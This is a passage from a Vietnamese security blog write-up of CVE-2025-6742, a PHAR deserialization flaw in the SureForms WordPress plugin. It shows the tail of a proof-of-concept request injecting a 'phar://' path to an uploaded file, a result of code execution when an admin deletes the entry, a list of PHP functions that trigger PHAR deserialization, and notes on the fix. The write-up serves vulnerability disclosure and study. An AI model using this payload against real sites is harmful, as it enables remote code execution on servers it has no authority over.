</span></span><span class="line hl"><span class="cl">Content-Disposition: form-data; name=&#34;srfm-input-7469d29b-lbl-VGV4dCBGaWVsZA-text-field[]&#34;
</span></span><span class="line"><span class="cl">
</span></span><span class="line hl"><span class="cl">phar://../../../wp-content/uploads/2025/11/poc.png
</span></span><span class="line"><span class="cl">------geckoformboundary951e0587d59c442ebcc7cae9dcac2221--</span></span></code></pre></td></tr></table>
</div>
</div><ol start="7">
<li>Khi admin xóa entry đã upload</li>
</ol>
<p><figure><a class="lightgallery" href="/posts/2025-11-19-cve-2025-6742/result.png" title="RCE khi admin xóa entry" data-thumbnail="/posts/2025-11-19-cve-2025-6742/result.png" data-sub-html="<h2>Result</h2><p>RCE khi admin xóa entry</p>"><img loading="lazy" src='/posts/2025-11-19-cve-2025-6742/result.png' alt="Result" height="841" width="1486"></a><figcaption class="image-caption">RCE khi admin xóa entry</figcaption>
  </figure></p>
<div class="alert alert-warning"><p class="alert-title"><svg class="icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" width="16" height="16"><path d="M6.457 1.047c.659-1.234 2.427-1.234 3.086.0l6.082 11.378A1.75 1.75.0 0114.082 15H1.918A1.75 1.75.0 01.375 12.425zm1.763.707a.25.25.0 00-.44.0L1.698 13.132a.25.25.0 00.22.368h12.164a.25.25.0 00.22-.368zm.53 3.996v2.5a.75.75.0 01-1.5.0v-2.5a.75.75.0 011.5.0zM9 11a1 1 0 11-2 0 1 1 0 012 0z"/></svg>Cảnh báo</p><p>Sau khi thử nhiều phiên bản PHP khác nhau, tôi nhận thấy rằng: Hàm <code>file_exists()</code> chỉ hoạt động ở các phiên bản <code>&lt;=7.4</code></p></div><p><strong>Một số hàm khác dùng để khai thác PHAR Deserialization:</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">copy                file_exists         file_get_contents   file_put_contents   
</span></span><span class="line"><span class="cl">file                fileatime           filectime           filegroup           
</span></span><span class="line"><span class="cl">fileinode           filemtime           fileowner           fileperms           
</span></span><span class="line"><span class="cl">filesize            filetype            fopen               is_dir              
</span></span><span class="line"><span class="cl">is_executable       is_file             is_link             is_readable         
</span></span><span class="line"><span class="cl">is_writable         lstat               mkdir               parse_ini_file      
</span></span><span class="line"><span class="cl">readfile            rename              rmdir               stat                
</span></span><span class="line"><span class="cl">touch               unlink  </span></span></code></pre></td></tr></table>
</div>
</div><h1 class="heading-element" id="conclusion"><span>Conclusion</span>
  <a href="#conclusion" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h1><p>Lỗ hổng <strong>PHP Object Injection trong SureForm &lt;= 1.7.3</strong> xuất phát từ việc sử dụng <code>file_exists()</code> và <code>unlink()</code> trực tiếp trên đường dẫn được kiểm soát bởi user mà không có ràng buộc phạm vi truy cập file. Tuy không có POP chain sẵn trong plugin, nhưng nếu hệ thống cài đặt thêm plugin hoặc theme có POP chain, kẻ tấn công có thể mở rộng mức độ khai thác đến xóa file, đọc dữ liệu nhạy cảm hoặc thậm chí thực thi mã (RCE). Bản vá 1.7.4 xử lý vấn đề bằng việc chuẩn hoá và giới hạn đường dẫn file vào thư mục upload hợp lệ nhằm loại bỏ vector khai thác.</p>
<h1 class="heading-element" id="key-takeaways"><span>Key Takeaways</span>
  <a href="#key-takeaways" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h1><ul>
<li>Lỗi phát sinh từ việc thao tác file trực tiếp dựa trên input người dùng chưa kiểm soát.</li>
<li>Việc chỉ dùng <code>file_exists()</code> có thể dẫn đến PHAR deserialization trên PHP ≤7.4.</li>
<li>Dù plugin không có POP chain sẵn, môi trường WordPress thường cài nhiều plugin → khả năng ghép chain rất cao.</li>
<li>Bản vá thêm kiểm tra chuẩn hóa đường dẫn, giới hạn phạm vi file và tránh sử dụng trực tiếp path đến filesystem.</li>
<li>Các hàm file-operation luôn tiềm ẩn nguy cơ khai thác nếu input không được kiểm soát chặt chẽ.</li>
</ul>
<h2 class="heading-element" id="references"><span>References</span>
  <a href="#references" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p><a href="https://book.hacktricks.wiki/en/pentesting-web/deserialization/index.html"target="_blank" rel="external nofollow noopener noreferrer">Deserialization</a></p>
<p><a href="https://patchstack.com/database/wordpress/plugin/sureforms/vulnerability/wordpress-sureforms-plugin-1-7-3-unauthenticated-php-object-injection-phar-vulnerability"target="_blank" rel="external nofollow noopener noreferrer">WordPress SureForm Plugin &lt;= 1.7.3 is vulnerable to a high priority PHP Object Injection</a></p></div><hr class="awesome-hr" />
    <h2 id="see-also">Nội dung liên quan</h2>
    <ul><li>
          <a href="/vi/posts/2025-11-26-cve-2025-26763/" title="CVE-2025-26763 Analysis &amp; POC">CVE-2025-26763 Analysis &amp; POC</a></li><li>
          <a href="/vi/posts/2025-11-25-cve-2025-3439/" title="CVE-2025-3439 Analysis &amp; POC">CVE-2025-3439 Analysis &amp; POC</a></li><li>
          <a href="/vi/posts/2025-11-24-cve-2025-48134/" title="CVE-2025-48134 Analysis &amp; POC">CVE-2025-48134 Analysis &amp; POC</a></li><li>
          <a href="/vi/posts/2025-11-23-cve-2025-30773/" title="CVE-2025-30773 Analysis &amp; POC">CVE-2025-30773 Analysis &amp; POC</a></li><li>
          <a href="/vi/posts/2025-11-21-cve-2025-2939/" title="CVE-2025-2939 Analysis &amp; POC">CVE-2025-2939 Analysis &amp; POC</a></li><li>
          <a href="/vi/posts/2025-11-20-cve-2025-49386/" title="CVE-2025-53572 Analysis &amp; POC">CVE-2025-53572 Analysis &amp; POC</a></li><li>
          <a href="/vi/posts/2025-11-18-cve-2025-53572/" title="CVE-2025-53572 Analysis &amp; POC">CVE-2025-53572 Analysis &amp; POC</a></li><li>
          <a href="/vi/posts/2025-11-17-cve-2025-49401/" title="CVE-2025-49401 Analysis &amp; POC">CVE-2025-49401 Analysis &amp; POC</a></li><li>
          <a href="/vi/posts/2025-11-14-cve-2025-9083/" title="CVE-2025-9083 Analysis &amp; POC">CVE-2025-9083 Analysis &amp; POC</a></li><li>
          <a href="/vi/posts/2025-11-28-cve-2025-9321/" title="CVE-2025-9321 Analysis &amp; POC">CVE-2025-9321 Analysis &amp; POC</a></li></ul><div class="post-footer" id="post-footer">
  <div class="post-info">
    <div class="post-info-line">
      <div class="post-info-mod"><span title="Cập nhật ngày 2025-11-25 21:12:53">Cập nhật ngày 2025-11-25&nbsp;<a class="git-hash" href="https://github.com/w41bu1/w41bu1.github.io/commit/5cdc85f0661b8418c6576dd1e38e9367a4445be8" rel="external nofollow noopener noreferrer" target="_blank" title="Update category&#10&#10Commit: 5cdc85f0661b8418c6576dd1e38e9367a4445be8 [5cdc85f]&#10Author: w41bu1&#10Date: 2025-11-25 21:12:53"><i class="fa-solid fa-hashtag fa-fw" aria-hidden="true"></i>5cdc85f</a></span>
      </div><div class="post-info-license">
            <span><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a></span>
          </div></div><div class="post-info-line">
        <div class="post-info-md"><span><a href="/vi/posts/2025-11-19-cve-2025-6742/index.md" title="Đọc với định dạng Markdown" class="link-to-markdown">Đọc với định dạng Markdown</a></span><span><a href="https://github.com/w41bu1/w41bu1.github.io/blob/main/content/posts%5c2025-11-19-CVE-2025-6742%5cindex.vi.md?plain=1" title="Xem mã nguồn"target="_blank" rel="external nofollow noopener noreferrer" class="link-to-source">Xem mã nguồn</a></span><span><a href="https://github.com/w41bu1/w41bu1.github.io/edit/main/content/posts%5c2025-11-19-CVE-2025-6742%5cindex.vi.md" title="Chỉnh sửa trang này"target="_blank" rel="external nofollow noopener noreferrer" class="link-to-edit">Chỉnh sửa trang này</a></span><span><a href="https://github.com/w41bu1/w41bu1.github.io/issues/new?title=[BUG]%20CVE-2025-6742&#43;Analysis&#43;%26&#43;POC&amp;body=%7cField%7cValue%7c%0A%7c-%7c-%7c%0A%7cTitle%7cCVE-2025-6742&#43;Analysis&#43;%26&#43;POC%7c%0A%7cURL%7chttp://localhost:1313/vi/posts/2025-11-19-cve-2025-6742/%7c%0A%7cFilename%7chttps://github.com/w41bu1/w41bu1.github.io/blob/main/content/posts%5c2025-11-19-CVE-2025-6742%5cindex.vi.md?plain=1%7c" title="Báo cáo lỗi"target="_blank" rel="external nofollow noopener noreferrer" class="link-to-report">Báo cáo lỗi</a></span><span><a href="vscode://file/D:%5cProject%5cw41bu1.github.io%5ccontent%5cposts%5c2025-11-19-CVE-2025-6742%5cindex.vi.md" title="Mở trong trình chỉnh sửa"target="_blank" rel="external nofollow noopener noreferrer" class="link-to-vscode">Mở trong trình chỉnh sửa</a></span></div>
        <div class="post-info-share">
          <span><a href="javascript:void(0);" title="Chia sẻ trên X" data-sharer="twitter" data-url="http://localhost:1313/vi/posts/2025-11-19-cve-2025-6742/" data-title="CVE-2025-6742 Analysis &amp; POC" data-hashtags="analyst,plugin,php object injection"><i class="fa-brands fa-x-twitter fa-fw" aria-hidden="true"></i></a>
  <a href="javascript:void(0);" title="Chia sẻ trên Facebook" data-sharer="facebook" data-url="http://localhost:1313/vi/posts/2025-11-19-cve-2025-6742/" data-hashtag="analyst"><i class="fa-brands fa-facebook-square fa-fw" aria-hidden="true"></i></a>
  <a href="javascript:void(0);" title="Chia sẻ trên Linkedin" data-sharer="linkedin" data-url="http://localhost:1313/vi/posts/2025-11-19-cve-2025-6742/"><i class="fa-brands fa-linkedin fa-fw" aria-hidden="true"></i></a>
  <a href="javascript:void(0);" title="Chia sẻ trên Hacker News" data-sharer="hackernews" data-url="http://localhost:1313/vi/posts/2025-11-19-cve-2025-6742/" data-title="CVE-2025-6742 Analysis &amp; POC"><i class="fa-brands fa-hacker-news fa-fw" aria-hidden="true"></i></a>
  </span>
        </div>
      </div></div>

  <div class="post-info-more">
    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="/vi/tags/analyst/" class="post-tag" title="Nhãn - Analyst">Analyst</a><a href="/vi/tags/plugin/" class="post-tag" title="Nhãn - Plugin">Plugin</a><a href="/vi/tags/php-object-injection/" class="post-tag" title="Nhãn - Php Object Injection">Php Object Injection</a></section>
    <section><span><a href="javascript:void(0);" onclick="window.history.back();">Quay lại</a></span>&nbsp;|&nbsp;<span><a href="/vi/">Trang chủ</a></span>
    </section>
  </div><div class="post-nav"><a href="/vi/posts/2025-11-18-cve-2025-53572/" class="post-nav-item" rel="prev" title="CVE-2025-53572 Analysis &amp; POC"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>CVE-2025-53572 Analysis &amp; POC</a><a href="/vi/posts/2025-11-20-cve-2025-49386/" class="post-nav-item" rel="next" title="CVE-2025-53572 Analysis &amp; POC">CVE-2025-53572 Analysis &amp; POC<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
</div>
</article>

  <aside class="toc" id="toc-auto" aria-label="Nội dung"><h2 class="toc-title">Nội dung&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
      <div class="toc-content always-active" id="toc-content-auto"></div></aside><dialog id="toc-dialog" aria-labelledby="toc-dialog-title" role="dialog">
      <div class="toc">
        <h2 class="toc-title">Nội dung</h2>
        <div class="toc-content" id="toc-content-drawer"><nav >
  <ul>
    <li><a href="#cve--basic-info">CVE &amp; Basic Info</a></li>
    <li><a href="#requirements">Requirements</a></li>
    <li><a href="#cause">Cause</a></li>
    <li><a href="#analysis">Analysis</a></li>
    <li><a href="#flow">Flow</a></li>
    <li><a href="#proof-of-concept-poc">Proof of Concept (PoC)</a></li>
  </ul>

  <ul>
    <li><a href="#references">References</a></li>
  </ul>
</nav></div>
      </div>
    </dialog></main><footer class="footer">
    <div class="footer-container"><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
            <span itemprop="copyrightYear">2025</span><span class="author" itemprop="copyrightHolder">
              <a href="github.com/w41bu1">Bui Van Y</a></span><span class="license footer-divider">w41bu1</span></div><div class="footer-line statistics"></div><div class="footer-line visitor">
          <span id="busuanzi_container_site_uv" title='Tổng khách truy cập'><i class="fa-regular fa-user fa-fw me-1" aria-hidden="true"></i><span id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span><span id="busuanzi_container_site_pv" class="footer-divider" title='Tổng lượt truy cập'><i class="fa-regular fa-eye fa-fw me-1" aria-hidden="true"></i><span id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span>
        </div><div class="footer-line beian"><span class="gov"><i class="fa-solid fa-user-secret"></i></span><span class="icp footer-divider"><i class="fa-solid fa-bug"></i></span></div></div>
  </footer></div><div class="widgets"><div class="fixed-buttons"><div class="fixed-button back-to-top animate__faster d-none" role="button" aria-label="Lên trên"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><svg viewBox="0 0 100 100">
              <circle class="bg" cx="50" cy="50" r="50"></circle>
              <circle class="progress" cx="50" cy="50" r="50"></circle>
            </svg></div><div id="toc-drawer-button" class="fixed-button toc-drawer-button d-none" role="button" aria-label="Nội dung"><i class="fa-solid fa-bars fa-fw" aria-hidden="true"></i></div></div><div id="mask"></div><noscript>
    <div class="noscript-warning">Trang web này hoạt động tốt nhất khi JavaScript được kích hoạt.</div>
  </noscript>
</div><link rel="stylesheet" href="/lib/lightgallery/css/lightgallery-bundle.min.css"><link rel="stylesheet" href="/lib/pace/themes/blue/pace-theme-minimal.css"><script src="/lib/autocomplete/autocomplete.min.js" defer></script><script src="/lib/fuse/fuse.min.js" defer></script><script src="/lib/lightgallery/lightgallery.min.js" defer></script><script src="/lib/lightgallery/plugins/thumbnail/lg-thumbnail.min.js" defer></script><script src="/lib/lightgallery/plugins/zoom/lg-zoom.min.js" defer></script><script src="/lib/sharer/sharer.min.js" async defer></script><script src="/lib/typeit/index.umd.js" defer></script><script src="/lib/cell-watermark/watermark.min.js" defer></script><script src="/lib/pace/pace.min.js" async defer></script><script src="/vi/js/config/70d5fc6e55305a69d2523ac6806c9ee8.js" defer></script><script src="/js/lib/mermaid.js" type="module"></script><script src="/js/theme.min.js" defer></script><script src="/js/flyfish.min.js" defer></script></body>
</html>
